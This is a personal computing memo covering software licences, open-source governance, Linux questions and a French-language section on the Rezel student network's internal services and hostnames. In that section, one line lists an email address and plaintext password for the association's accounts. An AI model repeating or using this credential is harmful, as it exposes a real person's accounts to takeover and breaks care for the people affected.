  * SA : Copyleft, i.e. edited versions but be under the same (Creative Commons) license
  * NC : Non commercial, do not make profit out of what's under the license
  * ND : No Derivatives, do not distribute edited copies of what's under the license
- You can abbreviate a license by using the [SPDX typology](https://spdx.org/licenses/) :
  * MIT
  * BSD-2-Clause, BSD-3-Clause
  * Apache-2.0
  * MPL-2.0
  * LGPL-2.1-only, LGPL-2.1-or-later, LGPL-3.0-only, LGPL-3.0-or-later
  * GPL-2.0-only, GPL-2.0-or-later, GPL-3.0-only, GPL-3.0-or-later
  * AGPL-3.0-only, AGPL-3.0-or-later
  * MIT OR Apache-2.0 (multiple licenses)
  * GPL-3.0-only WITH Classpath-exception-2.0 (additional clauses)
- Some projects ask to sign some documents for liceses to apply to contributor's contributions 
  * DCO (Developer Certificate of Origin)
    + The contributor engages to the origin of the contribution, _bref_, signs his contribution. 
    + Very light ; requires one line per commit (Signed-off-by: Your Name <your@email.com>)
    + This corresponds to the `-s`in Git.
  * CLA (Contributor License Agreement)
    + Like a DCO, with additional rights for the project owner(s),
    + such as the right to include the code into proprietary software
    + or to **change the license**.
  * CTA (Copyright Transfer Agreement)
    + Cede your patrimonial rights.
- Note : Extract of GitHub
```
Whenever you add Content to a repository containing notice of a
license, you license that Content under the same terms, and
you agree that you have the right to license that Content
under those terms. 

If you have a separate agreement to license
that Content under different terms, such as a contributor license
agreement, that agreement will supersede.

Isn’t this just how it works already? Yep. This is widely accepted
as the norm in the open-source community; it’s commonly referred
to by the shorthand "inbound=outbound". We’re just making it
explicit.
```
- Economic models
  * The classical model : a company sells licenses to allow usage of their product.
  * Commercial use exclusion : Software is free to use only for non-commercial use
  * Paid development instead of paid (sold) usage
    + The client then pays a company to develop a software with the wanted features. 
    + The client is then _a priori_ owner of the software, and can choose to distribute it under a license.
    + This is often the model chosen by some US Universities or public entities.
  * Open core
    + A free (as in "free speech" and/or as in "free beer") "core" of features, a paid version for extended features. 
  * Free usage, but non-free maintainance, or hosting (or other...)
    + Example : RedHat sells maintainance, support, development... of (some parts of) the RedHat Linux distribution
  * SaaS : Software as a Service
    + Example : Zulip, an (growingly popular) alternative to Slack, offers paid pre-configures hosting services for their software. 
    + These are (actually) free for research purposes and open-source projects, paid for companies.
  * Crownfunding / funding through donations / funding by bourses
    + For instance, the creator of Vue.js was funded this way.
    + Though, projects that recieve enough donations to fund a full-time development are very rare.
- Conventions around Free software
  * Individuals that interact with Free software have social norms. 
  * These are sometimes implicit, sometimes explicit.
  * In the latter case, very often, a Code of Conduct (`CODE OF CONDUCT.md`) is at the root of the (open) project (at the root of the GitHub project, ...)
  * People often fork projects
    + Either to develop some feature as to merge it afterwards (development fork)
    + Or, to maintain an abandonned project (Example : LibreOffice)
    + Or, to create a concurrent project (Example : CodiMD / HedgeDoc)
- Governance models
  * BDFL : Benevolum Dictator For Life (Example : Linus Torvalds for Linux, Guido van Rossum for Python)
  * The latters get their legitimacy either for initiating the project, or showing a high implication in the long run. 
  * Hierarchied meritocracy :
  * Do-ocracy : Quite explicit, this is actually implicitely implemented in most open-source projects (and projects in general)
  * Cooptation, onion structure...
- Possible contributions
  * Report a bug
  * Fix a bug
  * Suggest a feature
  * Add a feature
  * Change an existing feature
  * Write some documentation
  * Edit some documentation to make it clearer

### @ This document

- When deploying this manual on our personal website, it might be a good thing to _parse_ it and remove some unnecessary parts : like this, or the one right above. Maybe add a tag for titles lines of whole paragraphs that don't need to be deployed (Make them start with ``### @`` for instance).
- As Louis Chollet said : when undertaking something, always remember its original purpose :
  * Remembering things : when learning, reading, processing, writing down, to remember things better (rather than hearing/reading and forgetting) ; as a reminder this is the best way for learning (cf. Anki in prépa...)
  * Cheatsheet
  * A document I can quickly readthrough to re-grasp everything I've seen/known/understood before, to quickly reactivate my knowledge
  * To show people what we've seen in Computer Science before
- It should only contain non-trivial data, not trivial stuff everyone knows
- This website should be presented to others as a Memo (a big cheatsheet) containing information I processed, and not as something _intended to_ show my skills (or worse, to show off !) 
- Conventions :
  * Writing in English
  * Linting 
- Add appendixes for pratical stuff ?
  * Photos of server building
  * Code snippets for different languages
  * Screenshots of GIN practical works...

### Fun facts

- Rollbacks happen in online multiplayer videogames because packets are sent using UPD. :):D
- ``.io`` is the Top-Level Domain associated to the British Indian Ocean Territory. In October 2024, the United Kingdom announced that it would cede the British Indian Ocean Territory to Mauritius 'République de Maurice, in French). After the transfer, current IANA rules require the ``.io`` domain to be phased out within the following several years...! (Although, historically, some exceptions have been granted, as was the case for ``.su``). ``agar.io``, ``slither.io``, ``diep.io``, and ``github.io`` are extremely famous pages on the ``.io`` Top-Level Domain.
- Ubuntu devs are quite golems because of the existence of the link
  * http://archive.ubuntu.com/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/
  * http://archive.ubuntu.com/ubuntu exists, and if you click on the `ubuntu` folder, it leads to (a copy of ?) itself. This loop stops after clicking 38 times. Ptdrrr
- A paper written by experts describing Let's encrypt, "Let’s Encrypt: An Automated Certificate Authority to Encrypt the Entire Web", explicitely says : "Servers running Caddy exhibit nearly ubiquitous HTTPS deployment and use modern TLS configurations. ... We hope to see other popular server software follow Caddy's lead." !

### Other other

- https://bitwarden.com/ has a good strong password generator
- When choosing a Web framework to work with, or a programming language to develop (basically) anything :
  * **Look at what has been done with it**, choose something you like and would like to reproduce !
  * You are pretty much guaranteed to (be able to) get something you like.
  * Examples :
    + React : The final website developped by Séverin has a global style that... I don't really like so much (it reminds of (shitty) mobile apps). Happy that I didn't enter 
    + wordle.louan.me has a cool layout that I like !
    + dimden.dev too !
- ``^`` in Computer Science is called a **caret**
- 2FA = Two-Factor Authtication
- A Request for Comments (RFC) is a series of standards-setting documents  or the Internet. An RFC is authored by individuals or groups of engineers and computer scientists in the form of a memorandum describing methods, behaviors, research, or innovations applicable to the working of the Internet and Internet-connected systems.
- ``https://cppreference.com`` lists C and C++ commands. It can be used as a standard C and C++ documentation.
- W3Schools (``https://www.w3schools.com/``) is very useful for learning many things about many languages, especially Web-oriented programming languages.
- ``https://awesome-selfhosted.net/`` lists a bunch of self-hostable open-source softwares
- Linting is the automated checking of your source code for programmatic and stylistic errors. This is done by using a lint tool (otherwise known as linter).
- By default, "port" understates "TCP port".
- The ` character is called _backtick`. 
- When in (_virtually any_) terminal, `ALT+ENTER` puts in fullscreen. :):D
- RFCs, Request for Comments, are documents publicly published documents prominently by the IETF (Internet Engineering Task Force), that set standards, such as protocol specifications, typically.
- CVEs (Common Vulnerabilities and Exposures) is a system that provides publicly known security vulnerabilities and exposures. _Bref_, these show vulnerabilities and security breaches.
- CVEs are published _after_ the breach is patched ! (!!!)

## Remaining questions

- How come ``la`` displays anything in a Linux terminal ? How could I've known that ? Same for `l` ???
- The existence of the ``-T`` option for the ``clear`` command (the manual description of which is "``indicates the type of the terminal``" (<ins>type</ins> being an argument to be given : ``clear -T <type>`` ) implies the existence of different terminal Types. A way to understand why (the fucking hell on earth) ``bulledev`` acts strangely when pressing the arrow keys ? <ins>Note :</ins> The ``$TERM`` environment variable (``echo $TERM``) contains the terminal type.
- What does ``curl`` really do ?
- How to use a printer with linux ?
- How to use ``mount`` and ``umount`` ?
- ``sudo apt intall tm`` returned ``E: dpkg was interrupted, you must manually run 'sudo dpkg --configure -a' to correct the problem.'`` What happened, what is the problem, what does this command do and why does it solve the problem ? Also, What's the difference between ``apt`` and ``dpkg`` (and, more generally, between `pacman`, `nala` ... and all other package managers) ?
- What is the difference between `apt-get` and ``apt`` ?
- What is the difference between `apt update` and `apt upgrade` ?
- What is the difference between `apt rm` and `apt remove` ?
- How to update a pacjage manager's package list ? ``sudo apt update-list`` ?
- What do the colors mean in ``ls /`` and ``ls /bin`` (directories vs. files) ?
- How to use ``||``, ``&&``, ``>>`` and ``<<`` on Linux terminal ? 
- What is the language used on linux terminals ? 
- What does ``/usr``contain ? ``/usr/share/ `` ? ``/usr/local/share`` ?
- What does ``/etc`` contain ? How to use configurations ?
- What do the text/lighlight colors mean when using ``ls`` ?
- **What does ``curl`` do ?**
- Why does `.` in a Linux terminal not return an (a syn tax) error ? (There is clearly a hidden feature)
- **What is the difference between a command and a package ?** When using apt can I install commands directly ? What happens if I try to do that ?
- What's in ``/bin``, ``/var``, ``/usr/share``, and all other folders at ``/`` (``lost+found``, ...) ? (...)
- ``http://archive.ubuntu.com/ubuntu jammy-updates/`` ? Whos is Jammy (lol) ? What can be found on this website ?

## Rezel

This part should probably be hidden for security purposes

### Infrastructures internes

- grafana.fai.rezel.net est une instance de [Grafana](https://grafana.com/) hébergée chez Rezel qui permet d'avoir un Dashboard qui donne entre autres le traffic de FAI (Fournission Accès Intenet, en l'occurence, vu la grammaire de la phrase)
- garezeldap.rezel.net sert à se connecter (Keycloak, etc)
- Garezeldap est un annuaire LDAP, qui sert à gérer les comptes des télécommiens pour l'accès aux services des télécommiens. 
- GDO est un autre annuaire LDAP qui sert à gérer les comptes pour l'accès à la FAI.
- Authentik est aussi un fournisseur d'identité, dont Rezel se sert pour gérer l'accès (les connexions) au Gitlab FAI, aux routeurs...
- Zitadel est aussi un fournisseur d'identité, dont Rezel se sert pour gérer pour gérer l'accès (les connexions) aux adhérents pour la FAI.
- Il y a, dans Zitadel, une partie exposition et une partie stockage des données. Le stockage des données utilise un protocole différent
- Keycloak utilise l'annuaire LDAP. C'est un cousin de Authentik et Zitadel.
- Vaultwarden est le gestionnaire de mots de passe utilisé par Rezel
- vache.fai.rezel.net
- gdo.rezel.net (ou gdo.rezel.enst.fr) est le nom de la machine qui héberge le **FreeIPA**, qui est ce dont ils se servent pour gérer les droits d'administration.
- gitlab.fai.rezel.net contient le gitlab de tout le code lié à la FAI
- Proxmox & Truenas :
  * Proxmox is an hypervisor
  * Truenas is a special OS that's useful for doing backups.
- Garezeldap is a Directory service (in French : un annuaire)
- Our Garezeldap authentication information (account username/identifier) is the same as on ``matrix`` :
  * william.driot@gmail.com / sandwichfromage
- Sous-domaines de rezel.net :
  * ``lufi.rezel.net``
  * ``git.rezel.net`` (Gitea)
    + https://git.rezel.net/Rezel/ contains all public repositories
    + ``https://git.rezel.net/Rezel/rezelator`` is the one to add websites on ``index.rezel.net``
  * ``fai.rezel.net``
  * ``hosting.rezel.net``
  * ``bulle.rezel.net``
  * ``chat.rezel.net``
  * ``index.rezel.net``
  * ``matrix.rezel.net``
  * ``s.rezel.net`` (``https://s.rezel.net/account/qrcodes/new``)
  * ``peertube.rezel.net``
  * ``drive.rezel.net``
  * ``auth.rezel.net``
  * Some other services available at ``https://index.rezel.net/``
  * List on rezel.zone or hosting.repart
  * ``gitlab.rezel.net`` 
    + ``rezel.zone`` contains the DNS, especially ``/rezel/include/hosting.rezel``
    + ``hosting-repart`` contains the reverse-proxy server configuration, espacially ``haproxy-conf/domains_list.txt``
    + Read the documentations (READMEs) !
- To add some website to the DNS and make the reverse-proxy accept it...

enki : déploiement du réseau, écrit avec ansible (YAML)

### FAI (Fournission d'Accès à Internet) 

- OpenWRT est l'OS installé sur les Routeurs fournis et distribués par Rezel dans le cadre de la FAI qu'ils mettent en place.
- FTTH = Fiber To The Home : Fibre À La Maison

### Choses faites et à faire

- Petits trucs faits
  * Flasher des box, bugtracker le site de Séverin
  * Retrier les adresses sur hosting repart 
- Hosting : Gérer mieux
  * Faire en sorte qu'on ait le contact des gens
  * Et de pouvoir savoir quand ils ont plus besoin de leur VM
  * Automatiser ça

### Autre

- Process ``kswapd0`` taking 100% of CPU : 

### Rezel Daily

- 14/08/24
  * Hm Ansible est pété sur ansible.rezel.net
wtf y'a un binaire ansible dans ``/usr/local/bin/ansible`` mais aucune trace d'un paquet Ansible installé via pip ou apt :/
Ouais le paquet ansible n'existe pas... Y'a juste le binaire
J'ai tej le binaire dans /usr/local/bin et j'ai installé ansible via APT à la place
C'est réparé - j'ai installé ``ansible``, ``python3-ipalib`` & ``python3-ipaclient via APT``
Au vu de l'emplacement de l'ancien binaire ``Ansible /usr/local/bin`` & du fait que maintenant la machine est sous debian 12, j'imagine que Ansible avait globalement été installé via pip à l'époque et qu'il n'a pas survécu à l'upgrade :)
Maintenant l'install devrait être solide...
Antonin Blot
  * Sinon... Source .venv/bon/activate dans le dossier ansible et hop
  * Ça marchait
- 20/09
  * J'ai finis de déployer traefik et authentik en test. J'ai besoin d'aide pour la config du proxy d'auth Séverin Messiaen  pour arriver à discriminer un path qui doit être protégé et pas tout le domaine
- 23/09 
  * Pour hosting-repartv2, on a eu un test en prod pour le site d'une liste forum, si ça te paraît ok Flavien on migre ?
  * btw la fwd auth c'est par cookie, je pense que du coup pas besoin de modifier le front end de comete-tp
- 24/09
  * s.rezel.net semble avoir un problème de certificats 😅 Flavien Forest
  * hello ! de toute façon ça va migrer sur le nouveau, je pense que la hosting gw fait de la merde (cf le pb que j'ai eu avec transforumers)
  
## What is...

- What is...
  * un certificat ?
  * a DNS ?
  * "RDNS" ?
  * un proxy ? un reverseproxy ?
  * un pare-feu ?
  * Ansible
  * ``FTP`` ? Difference with HTTP ?
  * dolibarr ? 
  * KDE ? GNOME ?
  * Jammy ? (seen while installing packages with apt on Ubuntu)(https://manpages.ubuntu.com/manpages/) 
  * https://snapcraft.io/
  * X11 ? Wayland ? The XFCE Wayland development roadmap ? https://wiki.xfce.org/releng/wayland_roadmap
  * POSIX 

## Ressources

- https://git-scm.com/docs/
- https://www.gnu.org/software/coreutils/manual/html_node/
- https://gnu.org/software/coreutils
- Tunnel : Acquérir toute la data sur SSH
  * From ``man ssh``
  * From RFCs

## Projets

- ``curl la-tim.fr/marge``
- https://github.com/sagemath/sage
- https://github.com/manimCommunity/

## Unsorted 

- "Powerful websites you should know part. ..."